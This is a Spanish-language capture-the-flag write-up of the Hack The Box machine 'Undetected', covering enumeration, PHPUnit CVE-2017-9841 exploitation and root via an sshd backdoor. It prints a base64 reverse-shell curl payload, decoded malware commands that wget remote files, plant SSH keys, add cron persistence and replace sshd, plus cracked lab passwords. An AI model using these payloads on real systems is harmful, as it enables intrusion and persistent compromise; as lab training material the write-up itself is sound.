---
title: Hackthebox Writeup Undetected
date: 2022-04-23 04:07:39 am
categories: [HTB, Writeups]
tags: [HTB, Linux, Medium, Directory Fuzzing, PHPUnit, CVE-2017-9841, Encryption, backups, Brute Force, Apache, SSHD, Reverse Engineering, Backdoor, Python Scripting, Bash Scripting]

img_path: /assets/img/htb/writeups/undetected/
---

Máquina **Linux** donde enumeramos por **TCP** para hallar un subdominio que al aplicar **Directory Fuzzing** encontramos una ruta vulnerable del framework **PHPUnit** que nos permitía **Remote Code Execution (RCE)** y obtener una shell **(CVE-2017-9841)**. Luego encontramos en los **backups** del usuario actual un binario, que al leer strings imprimibles y desencriptar la data, mostraba la creación de un nuevo usuario y su contraseña encriptada. Entonces aplicamos **Brute Force** con **john**, y nos logeamos con ese usuario por **SSH**. Para la escalada encontramos un correo del usuario **root** hacia nosotros que nos comentaba sobre comportamientos raros del servidor **Apache**. Para ello, hicimos un script en **bash** para buscar archivos modificados del servidor, encontramos otro binario e igualmente al leer strings imprimibles y desencriptarlo, mostraba una modificación sospechosa del binario **Secure Shell Daemon (SSHD)**. Nos traemos el binario a nuestra máquina y debido al tamaño aplicamos **Reverse Engineering** con **ghidra**. Filtramos con palabras que nos pueden interesar como 'password/authentication' y encontramos una función que almacena un **Backdoor** encriptado. Logramos crear un script en **python** para desencriptarla, logearnos como **root** y obtener una shell.

* * *

![UndetectedLogo](logo.png){: .shadow}

|   OS  |      IP      | Release Date | Difficulty | Points |
|:-----:|:------------:|:------------:|:----------:|:------:|
| Linux | 10.10.11.146 |  19 Feb 2022 |   Medium   |   30   |

* * *

Antes de iniciar no olvidemos verficar que estamos conectados a la **VPN** de HTB y tenemos conexión a la máquina:

```shell
❯ ping -c1 10.10.11.146
PING 10.10.11.146 (10.10.11.146) 56(84) bytes of data.
64 bytes from 10.10.11.146: icmp_seq=1 ttl=63 time=119 ms
					  \______________________ Linux Machine
--- 10.10.11.146 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
	  \_________________\____________________________________ Successful connection
rtt min/avg/max/mdev = 118.675/118.675/118.675/0.000 ms
```
{: .nolineno}

> Explicación de parámetros:
>
> -c \<count\> : Número de paquetes ICMP que deseamos enviar a la máquina

## Enumeration

* * *

Con `nmap` realizamos un escaneo de tipo **TCP (Transfer Control Protocol)** para descubrir puertos abiertos:

```console
❯ nmap -p- --open -sS --min-rate 5000 -v -n 10.10.11.146
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-28 02:50 -05
Initiating Ping Scan at 02:50
Scanning 10.10.11.146 [4 ports]
Completed Ping Scan at 02:50, 0.17s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 02:50
Scanning 10.10.11.146 [65535 ports]
Discovered open port 22/tcp on 10.10.11.146
Discovered open port 80/tcp on 10.10.11.146
Completed SYN Stealth Scan at 02:50, 19.95s elapsed (65535 total ports)
Nmap scan report for 10.10.11.146
Host is up (0.33s latency).
Not shown: 54572 closed tcp ports (reset), 10961 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE
22/tcp open  ssh      
	      \_________ Secure Shell Protocol
80/tcp open  http     
	      \_________ HyperText Transfer Protocol
```

> Explicación de parámetros :
{: .prompt-info }

> -p- : Escanear todos los puertos, del 1 al 65,535
>
> \-\-open : Escanear solo puertos abiertos
>
> -sS : Solo enviar paquetes de tipo SYN (inicio de conexión), incrementa velocidad del escaneo
>
> \-\-min-rate \<number\> : Enviar una taza (\<number\>) de paquetes por segundo como mínimo 
>
> -v : Imprimir información del proceso del escaneo
>
> -n : No buscar nombres de dominio asociadas a la IP en cuestión (rDNS) 

Ahora escaneamos de manera específica los puertos **22 (SSH) - 80 (HTTP)** en cuestión:

```console
❯ nmap -p 22,80 -sCV -oN targetTCP 10.10.11.146
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-28 12:24 -05
Nmap scan report for djewelry.htb (10.10.11.146)
Host is up (0.39s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2 (protocol 2.0)
| ssh-hostkey: 
|   3072 be:66:06:dd:20:77:ef:98:7f:6e:73:4a:98:a5:d8:f0 (RSA)
|   256 1f:a2:09:72:70:68:f4:58:ed:1f:6c:49:7d:e2:13:39 (ECDSA)
|_  256 70:15:39:94:c2:cd:64:cb:b2:3b:d1:3e:f6:09:44:e8 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Diana's Jewelry
|_http-server-header: Apache/2.4.41 (Ubuntu)
```

> Explicación de parámetros :
{: .prompt-info}

> -p \<port\_1,port\_2,\.\.\.> : Indicamos que puertos queremos escanear 
>
> -sC : Ejecutar en los puertos scripts por defecto de nmap
> 
> -sV : Activar detección de versiones de los servicios que corren por los puertos
>
> -oN \<file\> : Guardar el output del escaneo en un archivo con formato Nmap

Ya que no disponemos de credenciales para entrar por **SSH**, empezamos con el servicio web que corre por el puerto **80 (HTTP)**:

> Con `whatweb` podemos ver tecnologías que usa el sitio

```console
❯ whatweb http://10.10.11.146
http//10.10.11.146 [200 OK] Apache[2.4.41], Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.11.146], JQuery[2.1.4], Script, Title[Diana's Jewelry]
```

> Si quieres una opción gráfica puedes usar en tu navegador la extensión [Wappalyzer](https://www.wappalyzer.com/apps/) y ver las tecnologías
{: .prompt-tip}

> Con `Firefox` podemos ver el sitio web

![HTTP/IP](http_ip.png){: .shadow}

De cara vemos el dominio `djewelry.htb`, pero no llega a aplicarse **Virtual hosting**

Toqueteando el landing page encontramos el subdominio `store.djewelry.htb`, lo agregamos a nuestro archivo _/etc/hosts_: `echo "10.10.11.146 store.djwelry.htb" >> /etc/hosts` y aquí si se aplica **Virtual hosting**:

![HTTP/SUBDOAMIN](http_store_djwelry.png){: .shadow}

> Tambien podemos encontrar el subdominio usando `curl`

```shell
❯ curl -s -X GET "http://10.10.11.146" | grep -oE "http.*htb" | sort -u
http://store.djewelry.htb
```
{: .nolineno }

Observamos la página pero no encontramos algo interesante así que aplicamos **Directory Fuzzing** con `gobuster`:

```console
❯ gobuster dir -t 60 -u "http://store.djewelry.htb/" -b 400,404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -r
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://store.djewelry.htb/
[+] Method:                  GET
[+] Threads:                 60
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   400,404
[+] User Agent:              gobuster/3.1.0
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
2022/04/28 19:00:43 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 200) [Size: 12563]
/css                  (Status: 200) [Size: 2175] 
/js                   (Status: 200) [Size: 2791] 
/vendor               (Status: 200) [Size: 3126] 
/fonts                (Status: 200) [Size: 7580]
```

> Explicación de parámetros :
{: .prompt-info}

> dir : Usar modo de enumeración de directorios/archivos
>
> -t \<count\> : Asignar \<count\> tareas en paraleo
>
> -u \<url\> : Url objetivo
>
> -b \<status\_code\> : Omitir output de ciertos \<status\_code\>
>
> -w \<wordlist\> : Ruta de \<wordlist\> para el fuzzing

Todas la rutas son clásicas de un sitio web menos `vendor`, el cuál tiene activo **Directory Listing**:

![HTTP/VENDOR](http_vendor_path.png){: .shadow}

## Foothold

* * *

Investigando un poco encontramos una vulnerabilidad que nos permite **Remote Code Execution** por medio del framework **PHPUnit [(CVE-2017-9841)](https://blog.ovhcloud.com/cve-2017-9841-what-is-it-and-how-do-we-protect-our-customers/)**

La vulnerabilidad se da gracias a la linea de código `eval('?>' . file_get_contents('php://input'));` del archivo `eval-stdin.php` de reside en la ruta `http://store.djewelry.htb/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php`

Ahora solo nos queda inyectar una **Reverse shell** y conseguimos entrar a la máquina como el usuario **www-data**:

Podemos hacerlo usando `burpsuite` o `curl` :

> **Burpsuite**
>
> ![BURPSUITE/RCE](burpsuite_rce.png)

> **Curl**
>
> Para evitar problemas con las comillas dobles y simples `"",''`, codificamos nuestra reverse shell a `base64` y ya en la petición lo decodeamos con `base64_decode` para ejecutarlo:
>
```shell
curl -s -XPOST -d '<?php system(base64_decode(L2Jpbi9iYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjE2LzEyMzQgMD4mMScK));' http://store.djewelry.htb/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
```
{: .nolineno }

> La vulnerabilidad funciona con cualquiera de los **HTTP methods**
{: .prompt-tip}

En ambos casos solo queda ponerse en escucha con `nc` por el puerto especificado, ejecutar lo anterior, recibir la shell y pa-dentro:

```console
❯ nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.10.14.16] from (UNKNOWN) [10.10.11.146] 38938
bash: cannot set terminal process group (866): Inappropriate ioctl for device
bash: no job control in this shell
www-data@production:/var/www/store/vendor/phpunit/phpunit/src/Util/PHP$ 
```

> En resumen, el código PHP obtiene un archivo **_file_get_contents()_** a través del flujo de entrada **_php://input_**, luego lo convierte en cadena y lo ejecuta **_eval()_**

> Para información mas detallada puede visitar el siguiente articulo: [https://www.imperva.com/blog/the-resurrection-of-phpunit-rce-vulnerability/](https://www.imperva.com/blog/the-resurrection-of-phpunit-rce-vulnerability/)
{: .prompt-info}

Enumerando como el usuario **www-data** encontramos en `/var/backups` un binario interesante llamado `info` que solo nuestro usuario puede leer y ejecutar

Como es un binario intentamos leer las cadenas imprimibles que podemos visualizar con `strings`. Por ello, pasamos el archivo a nuestra máquina y visualizamos lo siguiente:

```console
❯ strings info
........
.....
..........
776765742074656d7066696c65732e78797a2f617574686f72697a65645f6b657973202d4f202f726f6f742f2e7373682f617574686f72697a65645f6b6579733b20776765742074656d7066696c65
732e78797a2f2e6d61696e202d4f202f7661722f6c69622f2e6d61696e3b2063686d6f6420373535202f7661722f6c69622f2e6d61696e3b206563686f20222a2033202a202a202a20726f6f74202f
7661722f6c69622f2e6d61696e22203e3e202f6574632f63726f6e7461623b2061776b202d46223a2220272437203d3d20222f62696e2f6261736822202626202433203e3d2031303030207b737973
74656d28226563686f2022243122313a5c24365c247a5337796b4866464d673361596874345c2431495572685a616e5275445a6866316f49646e6f4f76586f6f6c4b6d6c77626b656742586b2e5674
47673738654c3757424d364f724e7447625a784b427450753855666d39684d30522f424c6441436f513054396e2f3a31383831333a303a39393939393a373a3a3a203e3e202f6574632f736861646f
7722297d27202f6574632f7061737377643b2061776b202d46223a2220272437203d3d20222f62696e2f6261736822202626202433203e3d2031303030207b73797374656d28226563686f20222431
22202224332220222436222022243722203e2075736572732e74787422297d27202f6574632f7061737377643b207768696c652072656164202d7220757365722067726f757020686f6d6520736865
6c6c205f3b20646f206563686f202224757365722231223a783a2467726f75703a2467726f75703a2c2c2c3a24686f6d653a247368656c6c22203e3e202f6574632f7061737377643b20646f6e6520
3c2075736572732e7478743b20726d2075736572732e7478743b
.......
.....
...........
```

Podemos reconocer que el formato es **Hexadecimal** así que lo decodeamos y encontramos una serie de comandos:

```shell
❯ cat hiddenHexData.txt | xxd -r -p | tr ';' '\n' | sed 's/^ //g'
wget tempfiles.xyz/authorized_keys -O /root/.ssh/authorized_keys
wget tempfiles.xyz/.main -O /var/lib/.main
chmod 755 /var/lib/.main
echo "* 3 * * * root /var/lib/.main" >> /etc/crontab
awk -F":" '$7 == "/bin/bash" && $3 >= 1000 {system("echo "$1"1:\$6\$zS7ykHfFMg3aYht4\$1IUrhZanRuDZhf1oIdnoOvXoolKmlwbkegBXk.VtGg78eL7WBM6OrNtGbZxKBtPu8Ufm9hM0R/BLdACoQ0T9n/:18813:0:99999:7::: >> /etc/shadow")}' /etc/passwd
awk -F":" '$7 == "/bin/bash" && $3 >= 1000 {system("echo "$1" "$3" "$6" "$7" > users.txt")}' /etc/passwd
while read -r user group home shell _
do echo "$user"1":x:$group:$group:,,,:$home:$shell" >> /etc/passwd
done < users.txt
rm users.txt
```
{: .nolineno }

Leyendo el código vemos que se está creando un usuario en base a uno ya existente, en otras palabras es el mismo usuario. Podemos verificar esto con un `cat /etc/passwd | grep bash` en la máquina víctima:

```console
www-data@production:/var/backups$ cat /etc/passwd | grep bash
root:x:0:0:root:/root:/bin/bash
steven:x:1000:1000:Steven Wright:/home/steven:/bin/bash
steven1:x:1000:1000:,,,:/home/steven:/bin/bash
    \_____________________________________________ User based on steven
```

En la creación del usuario podemos observar la contraseña de `steven1` encriptada. Así que procedemos a desencriptarla, nos logeamos por ssh y pa-dentro:

```shell
❯ echo "steven1:\$6\$zS7ykHfFMg3aYht4\$1IUrhZanRuDZhf1oIdnoOvXoolKmlwbkegBXk.VtGg78eL7WBM6OrNtGbZxKBtPu8Ufm9hM0R/BLdACoQ0T9n/" > hash
❯ john -w=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 SSE2 2x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 3 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
ihatehackers     (steven1)     
1g 0:00:01:09 DONE (2022-04-29 02:30) 0.01436g/s 1279p/s 1279c/s 1279C/s janedoe..halo03
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
❯ sshpass -p "ihatehackers" ssh steven1@10.10.11.146
steven@production:~$ find / -name user.txt 2> /dev/null | xargs ls -l
-rw-r----- 1 root steven 33 Apr 29 04:24 /home/steven/user.txt
```
{: .nolineno }

> Pueden preguntarse, ¿Por qué estamos como `steven` y no `steven1`?. La respuesta es que al logearnos el sistema detecta que nuestro **User ID** es **1000**, y al buscar el **UID** encuentra solo al usuario `steven`, ya que como el **UID** es único, el sistema tomará como perteneciente del **UID** al primer usuario que se creó
{: .prompt-tip}

## Privilege Escalation

* * *

Enumerando como **steven** encontramos en `/var/mail` (directorio para almacenar los archivos de buzón de correos de los usuarios) un correo por parte del usuario `root`:

```console
steven@production:/var/mail$ cd /var/mail/
steven@production:/var/mail$ cat steven 
From root@production  Sun, 25 Jul 2021 10:31:12 GMT
Return-Path: <root@production>
Received: from production (localhost [127.0.0.1])
        by production (8.15.2/8.15.2/Debian-18) with ESMTP id 80FAcdZ171847
        for <steven@production>; Sun, 25 Jul 2021 10:31:12 GMT
Received: (from root@localhost)
        by production (8.15.2/8.15.2/Submit) id 80FAcdZ171847;
        Sun, 25 Jul 2021 10:31:12 GMT
Date: Sun, 25 Jul 2021 10:31:12 GMT
Message-Id: <202107251031.80FAcdZ171847@production>
To: steven@production
From: root@production
Subject: Investigations

Hi Steven.

We recently updated the system but are still experiencing some strange behaviour with the Apache service.
We have temporarily moved the web store and database to another server whilst investigations are underway.
If for any reason you need access to the database or web application code, get in touch with Mark and he
will generate a temporary password for you to authenticate to the temporary server.

Thanks,
sysadmin
```

Nos comenta que existen comportamientos extraños con el servidor web `Apache`, por ello basandonos en la fecha podemos revisar que archivos se han modificado en ese tiempo. Para realizar esa tarea hize un script en `bash` para automatizar una búsqueda de que archivos se modificaron unos meses antes de estos extraños comportamientos:

```bash
#!/bin/bash


# Find apache files by date's mail

# Filtering directories
echo "[+] Creating dictionary of apache directories..."
find / -name "apache2" 2> /dev/null > paths

sleep 2

tput civis

# Searching files
echo -e "\n[+] Searching mail..."
mail_path=$(find / -type f -name $(whoami) 2> /dev/null)
echo $mail_path

echo -e "\n[+] Extracting date mail..."
email_date=$(date -r $mail_path "+%Y-%m-%d")
echo $email_date

declare -i date=${email_date:5:2}
let date-=3
modify_date=$(echo ${email_date:0:4}-"0$date"-${email_date:8:2})

echo -e "\n[+] Searching for modified files 3 months before the email was sent... ($modify_date - $email_date)"
while read path; do
        if [ -d $path ]; then
                echo -e "\t[+] Searching in path $path:";
                find $path -type f -newermt $modify_date ! -newermt $email_date -not -empty -ls 2> /dev/null;
                sleep 2;
        fi
done < paths

rm paths
```
> Puedes encontrar el script en mi repositorio: [https://github.com/E1P0TR0/](https://github.com/E1P0TR0/CVE-Machines_htb/tree/main/Auto-tools_Undetected/fileSearchApache)
{: .prompt-info}

Al ejecutarlo encontramos lo siguiente:

```console
steven@production:/tmp$ ./fileSearch.sh 
[+] Creating dictionary of apache directories...

[+] Searching mail...
/var/mail/steven

[+] Extracting date mail...
2021-07-25

[+] Searching for modified files 3 months before the email was sent... (2021-04-25 - 2021-07-25)
        [+] Searching in path /usr/share/bug/apache2:
        [+] Searching in path /usr/share/doc/apache2:
        [+] Searching in path /usr/share/apache2:
        [+] Searching in path /usr/lib/apache2:
     2050     36 -rw-r--r--   1 root     root        34800 May 17  2021 /usr/lib/apache2/modules/mod_reader.so
        [+] Searching in path /var/cache/apache2:
        [+] Searching in path /var/lib/php/modules/7.4/apache2:
        [+] Searching in path /var/lib/apache2:
        [+] Searching in path /var/log/apache2:
        [+] Searching in path /etc/php/7.4/apache2:
        [+] Searching in path /etc/ufw/applications.d/apache2:
        [+] Searching in path /etc/apache2:
    51006      4 -rw-r--r--   1 root     root          565 Jul  5  2021 /etc/apache2/mods-available/mpm_prefork.conf
    50834      4 -rw-r--r--   1 root     root           69 May 17  2021 /etc/apache2/mods-available/reader.load
    50831     40 -rw-r--r--   1 root     root        37616 Jul  5  2021 /etc/apache2/mods-available/mod_reader.o
    49589      4 -rw-r--r--   1 root     root          338 Jul  6  2021 /etc/apache2/sites-available/000-main.conf
    50858      8 -rw-r--r--   1 root     root         7224 Jun 17  2021 /etc/apache2/apache2.conf
        [+] Searching in path /run/apache2:
        [+] Searching in path /run/lock/apache2:
```

Observamos el archivo `mod_reader.so` _(conocidas como librerías dinámicas por la extensión .so - Shared Object)_ con última fecha de modificación en `May 17`, además tiene relación con el problema ya que los módulos en `apache` sirven para diversas funcionalidades del servidor

Ahora descargamos el archivo a nuestra máquina y vemos que también es un archivo ejecutable, así que extraemos cadenas imprimibles con `strings`:

```console
.....
....
......
d2dldCBzaGFyZWZpbGVzLnh5ei9pbWFnZS5qcGVnIC1PIC91c3Ivc2Jpbi9zc2hkOyB0b3VjaCAtZCBgZGF0ZSArJVktJW0tJWQgLXIgL3Vzci9zYmluL2EyZW5tb2RgIC91c3Ivc2Jpbi9zc2hk
.....
....
.
```

Viendo el formato nos damos cuenta que esta codificado en **Base64**, entonces lo decodeamos y obtenemos estos comandos:

```shell
❯ echo d2dldCBzaGFyZWZpbGVzLnh5ei9pbWFnZS5qcGVnIC1PIC91c3Ivc2Jpbi9zc2hkOyB0b3VjaCAtZCBgZGF0ZSArJVktJW0tJWQgLXIgL3Vzci9zYmluL2EyZW5tb2RgIC91c3Ivc2Jpbi9zc2hk > hiddenB64Data.txt
❯ cat hiddenB64Data.txt | base64 -d | tr ';' '\n' | sed 's/^ //g'
wget sharefiles.xyz/image.jpeg -O /usr/sbin/sshd
touch -d `date +%Y-%m-%d -r /usr/sbin/a2enmod` /usr/sbin/sshd
```
{: .nolineno }

Observamos que se concatena una imagen al binario `sshd` _(Servidor del protocolo SSH)_, y lo que parece sospechoso es que se altera la fecha por el binario `a2enmod` _(Comando para activar los módulos de apache)_

Ya que vemos relación con **SSH** y que el propietario `root` es el único que puede modificar este archivo, podemos descargar dicho archivo a nuestra máquina para analizarlo con mas detalle usando `ghidra` _(herramienta de ingeniería inversa)_:

> Filtramos por la palabra `password` y encontramos algo insteresante:

![GHIDRA/SSHD](ghidra_sshd.png){: .shadow}

Encontramos la función `auth_password` que contiene una variable `backdoor` _(método que permite a cualquier persona eludir medidas de seguridad para acceder de manera remota y como usuario de alto nivel, a un sistema informático sin el conocimiento del propietario)_ que guarda una cadena de carácteres en un arreglo. Veamos a detalle la función:

```c
int auth_password(ssh *ssh,char *password)

{
  Authctxt *ctxt;
  passwd *ppVar1;
  int iVar2;
  uint uVar3;
  byte *pbVar4;
  byte *pbVar5;
  size_t sVar6;
  byte bVar7;
  int iVar8;
  long in_FS_OFFSET;
  char backdoor [31]; // backdoor variable declaration
  byte local_39 [9];
  long local_30;
  
  bVar7 = 0xd6;
  ctxt = (Authctxt *)ssh->authctxt;
  local_30 = *(long *)(in_FS_OFFSET + 0x28);
  backdoor._28_2_ = 0xa9f4;		 // backdoor[28-30]
  ppVar1 = ctxt->pw;
  iVar8 = ctxt->valid;
  backdoor._24_4_ = 0xbcf0b5e3;		 // backdoor[24-28]
  backdoor._16_8_ = 0xb2d6f4a0fda0b3d6;	 // backdoor[16-24]
  backdoor[30] = -0x5b;			 // backdoor[30]
  backdoor._0_4_ = 0xf0e7abd6;		 // backdoor[0-4]
  backdoor._4_4_ = 0xa4b3a3f3;		 // backdoor[4-8]
  backdoor._8_4_ = 0xf7bbfdc8;		 // backdoor[8-12]
  backdoor._12_4_ = 0xfdb3d6e7; 	 // backdoor[12-16]

  pbVar4 = (byte *)backdoor; // assign a pointer to backdoor for modification

  // Application of processes to decrypt the backdoor
  while( true ) {
    pbVar5 = pbVar4 + 1; 	         // Store in pbVar5 the position of the next value
    *pbVar4 = bVar7 ^ 0x96;		 // Store xor operation value between pVar7 and '0x96' in current position (*pbVar4)
    if (pbVar5 == local_39) break;       // Terminate process
    bVar7 = *pbVar5;			 // Store value of pbVar5 in pVar7 
    pbVar4 = pbVar5;			 // Advance to next position
  }
  iVar2 = strcmp(password,backdoor);     // Compare password entered with the backdoor
  uVar3 = 1;

  // If strings are differents 
  if (iVar2 != 0) {
    sVar6 = strlen(password);
    uVar3 = 0;
    if (sVar6 < 0x401) {
      if ((ppVar1->pw_uid == 0) && (options.permit_root_login != 3)) {
        iVar8 = 0;
      }
      if ((*password != '\0') ||
         (uVar3 = options.permit_empty_passwd, options.permit_empty_passwd != 0)) {
        if (auth_password::expire_checked == 0) {
          auth_password::expire_checked = 1;
          iVar2 = auth_shadow_pwexpired(ctxt);
          if (iVar2 != 0) {
            ctxt->force_pwchange = 1;
          }
        }
        iVar2 = sys_auth_passwd(ssh,password);
        if (ctxt->force_pwchange != 0) {
          auth_restrict_session(ssh); // Restrict session
        }
        uVar3 = (uint)(iVar2 != 0 && iVar8 != 0);
      }
    }
  }
  // If are the same
  if (local_30 == *(long *)(in_FS_OFFSET + 0x28)) {
    return uVar3;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}
```

> Resumiendo el proceso, existe un **backdoor** creado por el desarrollador que sirve para validar la autenticación de un usuario y con ello efectuar la conexión por **SSH**, como se mencionó anteriormente, sobre un usuario privilegiado como **root**
{: .prompt-tip}

Ahora solo queda desencriptar esa cadena de tipo **Little Endian** a **Big Endian** _(formato en el que se almacenan los datos en forma de bytes en un ordenador)_, luego en formato **Hexadecimal** para luego aplicar la operación **XOR**. Para este proceso y a manera de práctica, hice un script en `python3` para automatizar todo el proceso:

```python
#!/usr/bin/python3

import signal, sys, subprocess, shlex
from pwn import *
import time

# ctrl + c
def signal_handler(signum, frame):
    print("\n[-] Exiting..."); sys.exit()

signal.signal(signal.SIGINT, signal_handler)

# help panel
def help():
    print("[!] Do not forget to install the requirements;   Example: sudo ./requirements.sh\n")
    log.info(f"Use: {sys.argv[0]} <file with backdoor data>;    Example: convertPass.py auth_password.c"); sys.exit()

# valid args
if len(sys.argv) != 2: help()

# read file
def readFile():
    p = log.progress('Extracting data from the file')
    name_file = "extractAndSort.sh"
    subprocess.run(shlex.split(f"chmod +x {name_file}"))
    output = subprocess.run(shlex.split(f"./{name_file} {sys.argv[1]}"), capture_output=True, text=True)
    time.sleep(2)
    p.status('Success!')
    return output.stdout.strip().replace(" ","")

# little-endian to big_endian
def littleToBig(data_litt):
    p = log.progress('Swaping endianndess')
    sections = 2
    data_litt = [data_litt[i : i + sections] for i in range(0, len(data_litt), sections)]
    data_litt = [i for i in data_litt if i != "0x"]
    time.sleep(2)
    p.status('Success!')
    return data_litt[::-1]

# hex to ascii
def hexToAscii(data_big):
    p = log.progress('Converting hexadecimal to ascii data')
    password = [chr(int(f"0x{i}", base=16) ^ 0x96) for i in data_big]
    time.sleep(2)
    p.status('Success!\n')
    return ''.join(password)

# process
def run():
    data_litt = readFile()
    time.sleep(1)
    data_big = littleToBig(data_litt)
    time.sleep(1)
    password = hexToAscii(data_big)
    time.sleep(1)
    p = log.progress('Password')
    p.success(password)

# main
if __name__ == '__main__':
    run()
```

> El scripts requiere algunos archivos para su uso, los encuentras en mi repositorio: [https://github.com/E1P0TR0/](https://github.com/E1P0TR0/CVE-Machines_htb/tree/main/Auto-tools_Undetected/decryptPassSSHDbinary)
{: .prompt-info}

Ahora solo nos queda ejecutar el script, obtenemos la clave de **root**, nos logeamos por **SSH** y pa-dentro:

```console
❯ ./convertPass.py auth_password.c
[.] Extracting data from the file: Success!
[../.....] Swaping endianndess: Success!
[./......] Converting hexadecimal to ascii data: Success!
[+] Password: @=qfe5%2^k-aq@%k@%6k6b@$u#f*b?3

❯ sshpass -p '@=qfe5%2^k-aq@%k@%6k6b@$u#f*b?3' ssh root@10.10.11.146
Last login: Fri Apr 29 17:03:53 2022 from 10.10.14.117
root@production:~# whoami
root
root@production:~# find / -name root.txt | xargs ls -l
-rw-r----- 1 root root 33 Apr 29 04:24 /root/root.txt
```

* * *

